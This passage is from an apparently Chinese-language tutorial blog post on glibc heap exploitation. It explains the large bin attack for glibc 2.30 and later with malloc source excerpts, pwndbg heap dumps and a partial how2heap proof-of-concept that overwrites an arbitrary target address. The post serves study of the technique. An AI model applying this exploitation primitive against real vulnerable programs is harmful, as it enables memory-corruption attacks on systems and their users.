<span class="keyword">intptr_t</span> *e = <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nThe new chunk is at %p\n&quot;</span>, e);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// sanity check</span></span><br><span class="line">    assert(e == stack_var);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Got control on target/stack!\n\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="5-large-bin-attack"><a href="#5-large-bin-attack" class="headerlink" title="5. large_bin_attack"></a>5. large_bin_attack</h3><p>通过该技术向目标地址写入一个大值</p><p>2.30 之后关于 largs bin 的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (bck-&gt;bk))&#123;</span><br><span class="line">fwd = bck;</span><br><span class="line">bck = bck-&gt;bk;</span><br><span class="line">victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里加了两个检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted </span></span><br><span class="line"><span class="string">(nextsize)&quot;</span>);</span><br></pre></td></tr></table></figure><p>以及</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);</span><br></pre></td></tr></table></figure><p>导致传统的 large bin attack 没法使用</p><p>但是存在一个新的利用路径: </p><p>首先布置如下的 heap </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; parseheap</span><br><span class="line">addr                prev                size                 status              fd                bk</span><br><span class="line"><span class="number">0x555555559000</span>      <span class="number">0x0</span>                 <span class="number">0x290</span>                Used                None              None</span><br><span class="line"><span class="number">0x555555559290</span>      <span class="number">0x0</span>                 <span class="number">0x430</span>                Used                None              None</span><br><span class="line"><span class="number">0x5555555596c0</span>      <span class="number">0x0</span>                 <span class="number">0x20</span>                 Used                None              None</span><br><span class="line"><span class="number">0x5555555596e0</span>      <span class="number">0x0</span>                 <span class="number">0x420</span>                Used                None              None</span><br><span class="line"><span class="number">0x555555559b00</span>      <span class="number">0x0</span>                 <span class="number">0x20</span>                 Used                None              None</span><br></pre></td></tr></table></figure><p>0x20 的为  guard chunk ，避免 free 之后 chunk 合并 , 然后我们free p1，此时 chunk p1 会放入 unsortedbin</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">─────────────────────────────────────────────────[ SOURCE (CODE) ]──────────────────────────────────────────────────</span><br><span class="line">In file: /media/psf/Home/Downloads/how2heap/glibc_2<span class="number">.31</span>/large_bin_attack.c</span><br><span class="line">   <span class="number">54</span>   <span class="built_in">printf</span>(<span class="string">&quot;Once again, allocate a guard chunk to prevent consolidate\n&quot;</span>);</span><br><span class="line">   <span class="number">55</span></span><br><span class="line">   <span class="number">56</span>   <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">   <span class="number">57</span></span><br><span class="line">   <span class="number">58</span>   <span class="built_in">free</span>(p1);</span><br><span class="line"> ► <span class="number">59</span>   <span class="built_in">printf</span>(<span class="string">&quot;Free the larger of the two --&gt; [p1] (%p)\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">   <span class="number">60</span>   <span class="keyword">size_t</span> *g3 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">   <span class="number">61</span>   <span class="built_in">printf</span>(<span class="string">&quot;Allocate a chunk larger than [p1] to insert [p1] into large bin\n&quot;</span>);</span><br><span class="line">   <span class="number">62</span></span><br><span class="line">   <span class="number">63</span>   <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">   <span class="number">64</span></span><br><span class="line">─────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp  <span class="number">0x7fffffffe280</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│      <span class="number">0x7fffffffe288</span> —▸ <span class="number">0x5555555592a0</span> —▸ <span class="number">0x7ffff7fb0be0</span> (main_arena+<span class="number">96</span>) —▸ <span class="number">0x555555559b20</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│      <span class="number">0x7fffffffe290</span> —▸ <span class="number">0x5555555596d0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│      <span class="number">0x7fffffffe298</span> —▸ <span class="number">0x5555555596f0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│      <span class="number">0x7fffffffe2a0</span> —▸ <span class="number">0x555555559b10</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│      <span class="number">0x7fffffffe2a8</span> —▸ <span class="number">0x555555555140</span> (_start) ◂— endbr64</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│      <span class="number">0x7fffffffe2b0</span> —▸ <span class="number">0x7fffffffe3b0</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│      <span class="number">0x7fffffffe2b8</span> ◂— <span class="number">0xf7624ffb64d1fe00</span></span><br><span class="line">───────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────</span><br><span class="line"> ► f <span class="number">0</span>     <span class="number">5555555553f</span>a main+<span class="number">465</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">7f</span>fff7dec0b3 __libc_start_main+<span class="number">243</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">empty</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x555555559290</span> —▸ <span class="number">0x7ffff7fb0be0</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x555555559290</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; n</span><br></pre></td></tr></table></figure><p>然后我们再  malloc 一个比 p1 大的 chunk，此时 p1 会被放入到 lagrebin</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">─────────────────────────────────────────────────[ SOURCE (CODE) ]──────────────────────────────────────────────────</span><br><span class="line">In file: /media/psf/Home/Downloads/how2heap/glibc_2<span class="number">.31</span>/large_bin_attack.c</span><br><span class="line">   <span class="number">56</span>   <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">   <span class="number">57</span></span><br><span class="line">   <span class="number">58</span>   <span class="built_in">free</span>(p1);</span><br><span class="line">   <span class="number">59</span>   <span class="built_in">printf</span>(<span class="string">&quot;Free the larger of the two --&gt; [p1] (%p)\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">   <span class="number">60</span>   <span class="keyword">size_t</span> *g3 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line"> ► <span class="number">61</span>   <span class="built_in">printf</span>(<span class="string">&quot;Allocate a chunk larger than [p1] to insert [p1] into large bin\n&quot;</span>);</span><br><span class="line">   <span class="number">62</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">empty</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line"><span class="number">0x400</span>: <span class="number">0x555555559290</span> —▸ <span class="number">0x7ffff7fb0fd0</span> (main_arena+<span class="number">1104</span>) ◂— <span class="number">0x555555559290</span></span><br></pre></td></tr></table></figure><p>然后我们在 free p2  ( p2 大小小于 p1 h和 p3) , 此时 p2 就会被放入到 unsortedbin 里</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">65</span>   <span class="built_in">free</span>(p2);</span><br><span class="line"> ► <span class="number">66</span>   <span class="built_in">printf</span>(<span class="string">&quot;Free the smaller of the two --&gt; [p2] (%p)\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line">   <span class="number">67</span>   <span class="built_in">printf</span>(<span class="string">&quot;At this point, we have one chunk in large bin [p1] (%p),\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">   <span class="number">68</span>   <span class="built_in">printf</span>(<span class="string">&quot;               and one chunk in unsorted bin [p2] (%p)\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">empty</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x5555555596e0</span> —▸ <span class="number">0x7ffff7fb0be0</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x5555555596e0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line"><span class="number">0x400</span>: <span class="number">0x555555559290</span> —▸ <span class="number">0x7ffff7fb0fd0</span> (main_arena+<span class="number">1104</span>) ◂— <span class="number">0x555555559290</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>然后我们修改 p1 的 bk_nextsize 指向 target-0x20 , 此时的 p1 在 largebin 里</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> ► <span class="number">72</span>   p1[<span class="number">3</span>] = (<span class="keyword">size_t</span>)((&amp;target)<span class="number">-4</span>);</span><br><span class="line">   <span class="number">73</span>   <span class="built_in">printf</span>(<span class="string">&quot;Now modify the p1-&gt;bk_nextsize to [target-0x20] (%p)\n&quot;</span>,(&amp;target)<span class="number">-4</span>);</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; x/<span class="number">20</span>gx p1<span class="number">-2</span></span><br><span class="line"><span class="number">0x555555559290</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000431</span></span><br><span class="line"><span class="number">0x5555555592a0</span>:<span class="number">0x00007ffff7fb0fd0</span><span class="number">0x00007ffff7fb0fd0</span></span><br><span class="line"><span class="number">0x5555555592b0</span>:<span class="number">0x0000555555559290</span><span class="number">0x00007fffffffe260</span> &lt;------ bk-&gt;nextsize</span><br><span class="line"><span class="number">0x5555555592c0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555555592d0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555555592e0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555555592f0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559300</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559310</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559320</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; p &amp;target</span><br><span class="line">$<span class="number">14</span> = (<span class="keyword">size_t</span> *) <span class="number">0x7fffffffe280</span></span><br><span class="line">pwndbg&gt; x/<span class="number">20</span>gx &amp;target<span class="number">-2</span></span><br><span class="line"><span class="number">0x7fffffffe260</span>:<span class="number">0x00007fffffffe2c0</span><span class="number">0x0000555555555140</span></span><br><span class="line"><span class="number">0x7fffffffe270</span>:<span class="number">0x00007fffffffe3b0</span><span class="number">0x00005555555554a4</span></span><br><span class="line"><span class="number">0x7fffffffe280</span>:<span class="number">0x0000000000000000</span><span class="number">0x00005555555592a0</span></span><br><span class="line"><span class="number">0x7fffffffe290</span>:<span class="number">0x00005555555596d0</span><span class="number">0x00005555555596f0</span></span><br><span class="line"><span class="number">0x7fffffffe2a0</span>:<span class="number">0x0000555555559b10</span><span class="number">0x0000555555559b30</span></span><br></pre></td></tr></table></figure><p>然后我们再 malloc 一个比 p2 大 chunk （此时 p2 在 unsortedbin 里），那么此时，就会将 p2 从 unsortedbin 取出，insert  largebins 里，那么就存在如下代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (bck-&gt;bk))&#123;</span><br><span class="line">fwd = bck;</span><br><span class="line">bck = bck-&gt;bk;</span><br><span class="line">victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>victim-&gt;fd_nextsize = fwd-&gt;fd;</code>   —- &gt; <code> p1-&gt;fd_nextsize = p2-&gt;fd</code></p><p><code>victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize</code>   ——&gt; <code>p1-&gt;bk_nextsize = p2-&gt;fd-&gt;bk_next_size</code> </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">10</span>gx p1<span class="number">-2</span></span><br><span class="line"><span class="number">0x555555559290</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000431</span></span><br><span class="line"><span class="number">0x5555555592a0</span>:<span class="number">0x00007ffff7fb0fd0</span><span class="number">0x00007ffff7fb0fd0</span></span><br><span class="line"><span class="number">0x5555555592b0</span>:<span class="number">0x0000555555559290</span><span class="number">0x00007fffffffe260</span></span><br><span class="line"><span class="number">0x5555555592c0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555555592d0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; x/<span class="number">10</span>gx p2<span class="number">-2</span></span><br><span class="line"><span class="number">0x5555555596e0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000421</span></span><br><span class="line"><span class="number">0x5555555596f0</span>:<span class="number">0x00007ffff7fb0be0</span><span class="number">0x00007ffff7fb0be0</span></span><br><span class="line"><span class="number">0x555555559700</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559710</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559720</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; x/<span class="number">10</span>gx <span class="number">0x00007ffff7fb0be0</span></span><br><span class="line"><span class="number">0x7ffff7fb0be0</span> &lt;main_arena+<span class="number">96</span>&gt;:<span class="number">0x0000555555559f60</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7fb0bf0</span> &lt;main_arena+<span class="number">112</span>&gt;:<span class="number">0x00005555555596e0</span><span class="number">0x00005555555596e0</span></span><br></pre></td></tr></table></figure><p>这样就成功在 target 目标写入 p2-&gt;fd-&gt;bk_next_size 的值，即 0x00005555555596e0</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x target</span><br><span class="line">$<span class="number">22</span> = <span class="number">0x5555555596e0</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>通常而言，这种写大数的行为，我们可以用来修改 <em>global_max_fast</em></p><p>完整代码如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">A revisit to large bin attack for after glibc2.30</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Relevant code snippet :</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">if ((unsigned long) (size) &lt; (unsigned long) chunksize_nomask (bck-&gt;bk))&#123;</span></span><br><span class="line"><span class="comment">fwd = bck;</span></span><br><span class="line"><span class="comment">bck = bck-&gt;bk;</span></span><br><span class="line"><span class="comment">victim-&gt;fd_nextsize = fwd-&gt;fd;</span></span><br><span class="line"><span class="comment">victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span></span><br><span class="line"><span class="comment">fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="comment">/*Disable IO buffering to prevent stream from interfering with heap*/</span></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Since glibc2.30, two new checks have been enforced on large bin chunk insertion\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Check 1 : \n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;    if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;        malloc_printerr (\&quot;malloc(): largebin double linked list corrupted (nextsize)\&quot;);\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Check 2 : \n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;    if (bck-&gt;fd != fwd)\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;        malloc_printerr (\&quot;malloc(): largebin double linked list corrupted (bk)\&quot;);\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;This prevents the traditional large bin attack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;However, there is still one possible path to trigger large bin attack. The PoC is shown below : \n\n&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;====================================================================\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">size_t</span> target = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Here is the target we want to overwrite (%p) : %lu\n\n&quot;</span>,&amp;target,target);</span><br><span class="line">  <span class="keyword">size_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;First, we allocate a large chunk [p1] (%p)\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="keyword">size_t</span> *g1 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;And another chunk to prevent consolidate\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">size_t</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;We also allocate a second large chunk [p2]  (%p).\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;This chunk should be smaller than [p1] and belong to the same large bin.\n&quot;</span>);</span><br><span class="line">  <span class="keyword">size_t</span> *g2 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Once again, allocate a guard chunk to prevent consolidate\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Free the larger of the two --&gt; [p1] (%p)\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="keyword">size_t</span> *g3 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Allocate a chunk larger than [p1] to insert [p1] into large bin\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p2);</span><br><span class="line">  <span 